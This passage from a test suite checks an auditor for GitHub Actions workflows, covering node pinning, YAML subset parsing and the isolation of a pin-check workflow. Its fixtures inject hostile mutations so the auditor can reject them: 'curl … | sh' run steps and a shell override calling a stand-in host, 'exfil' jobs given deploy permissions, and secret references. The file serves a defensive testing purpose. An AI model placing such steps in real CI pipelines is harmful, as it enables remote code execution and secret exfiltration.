  assert.ok(es.some((p) => /must be a block mapping, not flow-style/.test(p)) && es.some((p) => /keys outside \{name, uses, with\}.*env/.test(p)), 'env-smuggle + flow with must be rejected');
  assert.ok(auditYamlConstructs(envSmuggle).some((p) => /flow-style value not allowed for structural key/.test(p)));
  const envOnly = mutate(PAGES, WITH_BS, '        env:\n          node-version-file: ".node-version"\n');
  assert.ok(auditSetupNode(envOnly, { expectedSteps: 3 }).some((p) => /has no with: block/.test(p)));
  const nvfOutside = mutate(PAGES, WITH_BS, '        with:\n          cache: "npm"\n        env:\n          node-version-file: ".node-version"\n');
  assert.ok(auditSetupNode(nvfOutside, { expectedSteps: 3 }).some((p) => /with: block does not consume node-version-file/.test(p)));
  // (b″) Grok R4 F1: `with: # comment` header + mirror → still RED (withBlockOf strips the comment; allowlist applies)
  const withComment = mutate(PAGES, WITH_BS, '        with: # x\n          node-version-file: ".node-version"\n          cache: "npm"\n          mirror: https://example.invalid\n');
  assert.ok(auditSetupNode(withComment, { expectedSteps: 3 }).some((p) => /not allowlisted.*"mirror"/.test(p)), 'with: # comment must not skip the allowlist');
  // (b‴) Grok R4 F2: YAML explicit keys (`? node-version` / `: "24"`) and escape-bearing quoted keys (`"mi\u0072ror"`) are valid YAML that a
  //      real parser resolves to the inputs node-version / mirror while line regexes see nothing → BOTH the with-block audit and the
  //      CI-0 subset lexer reject them outright (fail closed), never interpret them
  const explicitKey = mutate(PAGES, WITH_BS, '        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n          ? node-version\n          : "24.22.1"\n');
  assert.ok(auditSetupNode(explicitKey, { expectedSteps: 3 }).some((p) => /unrecognised line inside setup-node with/.test(p)), 'explicit ?-key must be rejected by the with-block audit');
  assert.ok(auditYamlConstructs(explicitKey).some((p) => /outside the accepted subset/.test(p)), 'explicit ?-key must be rejected by the subset lexer');
  const escapedKey = mutate(PAGES, WITH_BS, '        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n          "mi\\u0072ror": https://example.invalid\n');
  assert.ok(auditSetupNode(escapedKey, { expectedSteps: 3 }).some((p) => /unrecognised line inside setup-node with/.test(p)), 'escaped quoted key must be rejected by the with-block audit');
  assert.ok(auditYamlConstructs(escapedKey).some((p) => /outside the accepted subset/.test(p)), 'escaped quoted key must be rejected by the subset lexer');
  // duplicate mappings (two with: blocks in one step; Cache/cache twice) → RED; a step that starts with `- id:` is still inventoried
  const dupWith = mutate(PAGES, WITH_BS, '        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n        with:\n          node-version: "24"\n');
  assert.ok(auditYamlConstructs(dupWith).some((p) => /duplicate key "with"/.test(p)));
  assert.ok(auditSetupNode(dupWith, { expectedSteps: 3 }).some((p) => /more than one with: block/.test(p)));
  assert.ok(auditYamlSubset(mutate(PAGES, WITH_BS, '        with:\n          node-version-file: ".node-version"\n          cache: "npm"\n          Cache: "npm"\n')).some((p) => /duplicate key "cache"/.test(p)));
  const idFirst = mutate(PAGES, /      - name: Set up Node\.js\n        uses: actions\/setup-node@([0-9a-f]{40}) # v7\.1\.0\n        with:\n          node-version-file: "\.node-version"\n          cache: "npm"\n/, '      - id: n\n        uses: actions/setup-node@$1 # v7.1.0\n        with:\n          node-version-file: ".node-version"\n          mirror: https://example.invalid\n');
  assert.ok(auditSetupNode(idFirst, { expectedSteps: 3 }).some((p) => /not allowlisted.*"mirror"/.test(p)), 'a step starting with `- id:` must still be inventoried');
  // subset lexer unit arms: tab indentation, document marker, anchor/alias/tag values, quoted key, plain sequence item; real files pass (incl. the run: | block scalar)
  assert.ok(auditYamlSubset('jobs:\n\tx: 1\n').some((p) => /tab indentation/.test(p)));
  assert.ok(auditYamlSubset('---\njobs:\n').some((p) => /outside the accepted subset/.test(p)));
  for (const v of ['a: &x', 'a: *x', 'a: !!str x', 'a: %x']) assert.ok(auditYamlSubset(`${v}\n`).some((p) => /reserved indicator/.test(p)), `value not rejected: ${v}`);
  assert.ok(auditYamlSubset("'on':\n  push:\n").some((p) => /outside the accepted subset/.test(p)));
  assert.ok(auditYamlSubset('steps:\n  - echo\n').some((p) => /outside the accepted subset/.test(p)));
  assert.deepEqual(auditYamlSubset('a:\n  run: |\n    x: y\n    ? z\n  b: 1\n'), [], 'block-scalar content is skipped by indentation');
  assert.deepEqual(auditYamlSubset(PAGES), []);
  assert.deepEqual(auditYamlSubset(PIN_CHECK), []);
  // (b⁗) Codex r7 F1: a block scalar (`- name: |`) carrying counterfeit `uses: actions/setup-node@… / with: / node-version-file:` text while
  //      the real step only runs a command. The lexer rightly skips scalar content — so every semantic audit must see it stripped too
  //      (stripBlockScalars() inside normalizeYaml()): 2 real setup-node steps, validate has 0 → RED. Multi-line quoted / flow values and
  //      next-line scalar values (other ways to hide "key:"-looking lines inside a scalar) are rejected by the lexer outright.
  const SETUP_VALIDATE = /      - name: Set up Node\.js\n        uses: actions\/setup-node@([0-9a-f]{40}) # v7\.1\.0\n        with:\n          node-version-file: "\.node-version"\n\n      - name: Generate task manifest/;
  const counterfeit = mutate(PAGES, SETUP_VALIDATE, '      - name: |\n          Set up Node.js\n          uses: actions/setup-node@$1 # v7.1.0\n          with:\n            node-version-file: ".node-version"\n        run: echo counterfeit\n\n      - name: Generate task manifest');
  assert.deepEqual(auditYamlSubset(counterfeit), [], 'the counterfeit is valid subset YAML (scalar content is skipped) — the semantic audits must catch it');
  assert.equal(stepBlocks(counterfeit).filter((b) => /uses:\s*actions\/setup-node@/.test(b)).length, 2, 'scalar content must be invisible to stepBlocks');
  const cp = auditPagesWorkflow(counterfeit);
  assert.ok(cp.some((p) => /expected 3 setup-node steps, found 2/.test(p)) && cp.some((p) => /job "validate" must have exactly one setup-node step consuming \.node-version, found 0/.test(p)), 'block-scalar counterfeit must be RED');
  assert.doesNotMatch(stripBlockScalars(counterfeit), /echo "::error file=tasks\.json/, 'the real run: | script body is stripped too');
  assert.equal(lines(stripBlockScalars(PAGES)).length, lines(PAGES).length, 'line count preserved');
  const quotedSpan = mutate(PAGES, SETUP_VALIDATE, '      - name: "Set up\n          uses: actions/setup-node@$1 # v7.1.0"\n        run: echo counterfeit\n\n      - name: Generate task manifest');
  assert.ok(auditYamlSubset(quotedSpan).some((p) => /double-quoted value must open and close on the same line/.test(p)));
  assert.ok(auditYamlSubset("a: 'x\n  uses: y'\n").some((p) => /single-quoted value must open and close/.test(p)));
  const flowSpan = mutate(PAGES, SETUP_VALIDATE, '      - name: Set up Node.js\n        uses: actions/setup-node@$1 # v7.1.0\n        with: [\n          node-version-file: ".node-version" ]\n\n      - name: Generate task manifest');
  assert.ok(auditYamlSubset(flowSpan).some((p) => /flow sequence must close on the same line/.test(p)));
  assert.ok(auditYamlSubset('a: {\n  b: 1 }\n').some((p) => /flow mapping must close on the same line/.test(p)));
  assert.ok(auditYamlSubset('with:\n  node-version:\n    "24"\n').some((p) => /outside the accepted subset/.test(p)), 'a next-line scalar value is outside the subset');
  // (b⁗′) Grok r7 F1: the setup-node inventory matched the SUBSTRING `uses: actions/setup-node@` anywhere in the step text — a checkout step
  //       whose quoted name (or trailing comment) carries that string, plus a with: node-version-file, impersonated setup-node after the real
  //       step was deleted. Now only the `uses:` KEY (comment-stripped, key-anchored) identifies the action → RED. The unquoted plain form is
  //       invalid YAML (": " in a plain scalar; a real parser rejects it) and the lexer rejects it too.
  const SHA = PAGES.match(/^\s*uses:\s*actions\/setup-node@([0-9a-f]{40})/m)[1];
  const CHECKOUT_TO_SETUP = /      - name: Checkout\n        uses: actions\/checkout@([0-9a-f]{40}) # v7\.0\.1\n\n([\s\S]*?)      - name: Set up Node\.js\n        uses: actions\/setup-node@[0-9a-f]{40} # v7\.1\.0\n        with:\n          node-version-file: "\.node-version"\n\n      - name: Generate task manifest/;
  for (const nameLine of [`      - name: "uses: actions/setup-node@${SHA}"`, `      - name: Checkout # uses: actions/setup-node@${SHA}`]) {
    const t = mutate(PAGES, CHECKOUT_TO_SETUP, `${nameLine}\n        uses: actions/checkout@$1 # v7.0.1\n        with:\n          node-version-file: ".node-version"\n\n$2      - name: Generate task manifest`);
    assert.deepEqual(auditYamlSubset(t), [], 'the impersonation is valid subset YAML — the semantic audits must catch it');
    const p = auditPagesWorkflow(t);
    assert.ok(p.some((x) => /expected 3 setup-node steps, found 2/.test(x)) && p.some((x) => /job "validate" must have exactly one setup-node step consuming \.node-version, found 0/.test(x)), `impersonation not caught: ${nameLine.trim()}`);
  }
  assert.ok(auditYamlSubset(mutate(PAGES, CHECKOUT_TO_SETUP, `      - name: uses: actions/setup-node@${SHA}\n        uses: actions/checkout@$1 # v7.0.1\n\n$2      - name: Generate task manifest`)).some((p) => /plain scalar value contains ": "/.test(p)));
  assert.equal(usesRefOf('      - name: "uses: actions/setup-node@x" # uses: actions/setup-node@y\n        uses: actions/checkout@abc # v7.0.1\n'), 'actions/checkout@abc');
  // (b⁗″) Grok r7 F2: `if: false` (GitHub skips the step), `continue-on-error: true`, `env:` or any other key on a setup-node step → RED
  for (const extraKey of ['if: false', 'if: ${{ false }}', 'continue-on-error: true', 'timeout-minutes: 1', 'id: n']) {
    const t = mutate(PAGES, /      - name: Set up Node\.js\n        uses: actions\/setup-node@/g, `      - name: Set up Node.js\n        ${extraKey}\n        uses: actions/setup-node@`);
    assert.ok(auditSetupNode(t, { expectedSteps: 3 }).some((p) => /keys outside \{name, uses, with\}/.test(p)), `extra step key not caught: ${extraKey}`);
  }
  assert.deepEqual(stepKeys('      - name: x\n        uses: y\n        with:\n          a: 1\n          if: false\n        # if: false\n'), ['name', 'uses', 'with'], 'nested with-keys and comments are not step keys');
  // (b⁗‴) ordering: a run: step before setup-node executes on the image Node → RED; container:/services: on a pages.yml job → RED
  const reordered = mutate(PAGES, /      - name: Set up Node\.js\n        uses: actions\/setup-node@([0-9a-f]{40}) # v7\.1\.0\n        with:\n          node-version-file: "\.node-version"\n\n      - name: Generate task manifest\n        run: node scripts\/build-manifest\.mjs --strict\n/, '      - name: Generate task manifest\n        run: node scripts/build-manifest.mjs --strict\n\n      - name: Set up Node.js\n        uses: actions/setup-node@$1 # v7.1.0\n        with:\n          node-version-file: ".node-version"\n');
  assert.ok(auditPagesWorkflow(reordered).some((p) => /job "validate": a run: step precedes the setup-node step/.test(p)));
  assert.ok(auditPagesWorkflow(mutate(PAGES, /  validate:\n    runs-on: ubuntu-26\.04\n/, '  validate:\n    runs-on: ubuntu-26.04\n    container: node:24\n')).some((p) => /job "validate" must not use "container:"/.test(p)));
  // (c) a job dropped its setup-node → count + per-job RED
  const fewer = mutate(PAGES, /      - name: Set up Node\.js\n        uses: actions\/setup-node@[0-9a-f]{40} # v\d+\.\d+\.\d+\n        with:\n          node-version-file: "\.node-version"\n\n      - name: Configure Pages/, '      - name: Configure Pages');
  const fewerP = auditPagesWorkflow(fewer);
  assert.ok(fewerP.some((p) => /expected 3 setup-node steps, found 2/.test(p)) && fewerP.some((p) => /job "deploy" must have exactly one setup-node/.test(p)));
  // (d) rolling alias → CI-3 RED
  assert.ok(auditRunsOn(mutate(PAGES, /runs-on: ubuntu-26\.04/, 'runs-on: ubuntu-latest')).some((p) => /explicit GA label/.test(p)));
  // (e) tag-pinned / third-party action → CI-4 RED
  assert.ok(auditUsesPinning(mutate(PAGES, /actions\/checkout@[0-9a-f]{40} # v7\.0\.1/, 'actions/checkout@v7')).some((p) => /not pinned to a 40-hex/.test(p)));
  assert.ok(auditUsesPinning(mutate(PAGES, /actions\/checkout@/, 'someone/checkout@')).some((p) => /not a GitHub-owned action/.test(p)));
  // (f) extra jobs: underscore id, quoted id, id with trailing comment, no setup-node, with deploy perms → RED (Grok F3)
  for (const header of ['  pin_audit:', '  "exfil":', '  exfil: # note']) {
    const t = mutate(PAGES, /\njobs:\n/, `\njobs:\n${header}\n    runs-on: ubuntu-26.04\n    permissions:\n      pages: write\n      id-token: write\n    steps:\n      - run: echo hi\n`);
    const names = jobNames(t);
    assert.equal(names.length, 4, `job header not inventoried: ${header}`);
    const p = auditPagesWorkflow(t);
    assert.ok(p.some((x) => /expected 3 jobs/.test(x)) && p.some((x) => /must have exactly one setup-node step consuming \.node-version, found 0/.test(x)), `extra job not caught: ${header}`);
  }
  // (f′) Grok R3 F1: anchored / flow-style / aliased job definitions are not interpreted — they are REJECTED outright (fail closed)
  const anchored = mutate(PAGES, /\njobs:\n/, '\njobs:\n  exfil: &exfil\n    runs-on: ubuntu-26.04\n    permissions:\n      pages: write\n      id-token: write\n    steps:\n      - uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 # v5.0.1\n');
  const pa = auditPagesWorkflow(anchored);
  assert.ok(pa.some((x) => /anchor\/alias not allowed/.test(x)) && pa.some((x) => /unsupported job header syntax/.test(x)) && pa.some((x) => /expected 3 jobs/.test(x)), 'anchored job must be rejected');
  const flow = mutate(PAGES, /\njobs:\n/, '\njobs:\n  exfil: { runs-on: ubuntu-26.04, permissions: { pages: write, id-token: write }, steps: [ { run: echo hi } ] }\n');
  const pf = auditPagesWorkflow(flow);
  assert.ok(pf.some((x) => /flow-style/.test(x)) && pf.some((x) => /unsupported job header syntax/.test(x)), 'flow-style job must be rejected');
  const aliased = mutate(PAGES, /\njobs:\n/, '\njobs:\n  exfil: *deploy\n');
  assert.ok(auditPagesWorkflow(aliased).some((x) => /anchor\/alias not allowed|unsupported job header syntax/.test(x)), 'aliased job must be rejected');
  const mergeKey = mutate(PAGES, /    runs-on: ubuntu-26\.04\n    steps:\n      - name: Checkout\n        uses: actions\/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\.0\.1\n\n      # Node is pinned/, '    runs-on: ubuntu-26.04\n    <<: *x\n    steps:\n      - name: Checkout\n        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n\n      # Node is pinned');
  assert.ok(auditPagesWorkflow(mergeKey).some((x) => /merge key not allowed/.test(x)));
  assert.deepEqual(auditYamlConstructs(PAGES), [], 'the real workflow uses no anchors/aliases/flow jobs (the ${{ }} expressions are not flagged)');
  assert.deepEqual(auditYamlConstructs(PIN_CHECK), []);
  // (g) pin-check isolation arms: push trigger (bare + quoted), job-level permissions (bare + quoted write), environment, deploy action,
  //     secrets ref, missing dispatch, extra run, shell override, extra uses (github-script), second job, missing timeout → CI-5 RED
  const arms = [
    [/  workflow_dispatch:\n/, '  workflow_dispatch:\n  push:\n    branches: ["main"]\n', /only be triggered by schedule/],
    [/  workflow_dispatch:\n/, '  workflow_dispatch:\n  "pull_request_target":\n    branches: ["main"]\n', /only be triggered by schedule/],
    [/    timeout-minutes: 5\n/, '    timeout-minutes: 5\n    permissions:\n      actions: write\n', /must not hold any write permission: "actions: write"/],
    [/    timeout-minutes: 5\n/, '    timeout-minutes: 5\n    "permissions":\n      "contents": write\n      "pages": write\n', /must not hold any write permission: "contents: write"/],
    [/    timeout-minutes: 5\n/, '    timeout-minutes: 5\n    "environment": github-pages\n', /must not use "environment:"/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n      - uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 # v5.0.1\n', /Pages\/deploy|may only use/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n        env:\n          T: ${{ secrets.X }}\n', /secrets or GITHUB_TOKEN|must not use "env:"/],
    [/  workflow_dispatch:\n/, '', /lacks the workflow_dispatch/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n      - run: curl -s https://example.invalid | sh\n', /may only run/],
    [/        run: node scripts\/check-node-pin\.mjs\n/, '        shell: bash -c "curl -s https://example.invalid | sh; {0}"\n        run: node scripts/check-node-pin.mjs\n', /must not use "shell:"/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n', /may only use actions\/checkout|exactly 2 uses/],
    [/\njobs:\n/, '\njobs:\n  other:\n    runs-on: ubuntu-26.04\n    steps:\n      - run: node scripts/check-node-pin.mjs\n', /exactly one job/],
    [/    timeout-minutes: 5\n/, '', /timeout-minutes/],
  ];
  for (const [from, to, expect] of arms) {
    const t = mutate(PIN_CHECK, from, to);
    assert.ok(auditPinCheckWorkflow(t).some((p) => expect.test(p)), `arm not caught: ${String(from).slice(0, 40)} → ${to.slice(0, 40)}`);
    assert.notEqual(canonicalPinCheck(t), PIN_CHECK_CANONICAL, 'canonical-form gate (CI-5b) must also go RED');
  }
  // (g′) Grok R4 F3: a cron that never fires (31 Feb) passes the CI-5b placeholder equality → the semantic cron check must go RED;
  //      out-of-range fields, day-of-week 7, names, @weekly and non-weekly shapes are rejected; the real cron and arm (i)'s edit pass
  for (const bad of ['0 0 31 2 *', '60 6 * * 1', '17 24 * * 1', '17 6 * * 7', '17 6 1 * *', '@weekly', '17 6 * * MON', '*/5 * * * *']) {
    assert.ok(auditPinCheckWorkflow(mutate(PIN_CHECK, /cron: "17 6 \* \* 1"/, `cron: "${bad}"`)).some((p) => /cron must be a weekly/.test(p)), `cron not caught: ${bad}`);
  }
  assert.ok(auditPinCheckWorkflow(mutate(PIN_CHECK, /    - cron: "17 6 \* \* 1" # Mondays 06:17 UTC\n/, '    - cron: "17 6 * * 1"\n    - cron: "0 0 31 2 *"\n')).some((p) => /exactly one cron/.test(p)));
  // (h) .node-version real predicate against known-bad values (not constant comparison)
  assert.deepEqual(auditNodeVersionFile('22.23.4\n'), []);
  assert.ok(auditNodeVersionFile('24.22.1\n').some((p) => /major 24 != approved 22/.test(p)));
  assert.ok(auditNodeVersionFile('22\n').some((p) => /exact X\.Y\.Z/.test(p)));
  assert.ok(auditNodeVersionFile('v22.23.4\n').some((p) => /exact X\.Y\.Z/.test(p)));
  assert.ok(auditNodeVersionFile('22.23.4\n\n').some((p) => /trailing newline/.test(p)));
  assert.ok(auditNodeVersionFile('22.23.4').some((p) => /trailing newline/.test(p)));
  // (i) canonical-form gate survives the ONLY legitimate drift (Dependabot SHA bump + version comment, cron edit)
  const bumped = PIN_CHECK.replace(/actions\/checkout@[0-9a-f]{40} # v7\.0\.1/, 'actions/checkout@' + 'f'.repeat(40) + ' # v7.1.0').replace(/cron: "17 6 \* \* 1"/, 'cron: "5 4 * * 2"');
  assert.notEqual(bumped, PIN_CHECK);
  assert.equal(canonicalPinCheck(bumped), PIN_CHECK_CANONICAL);
});
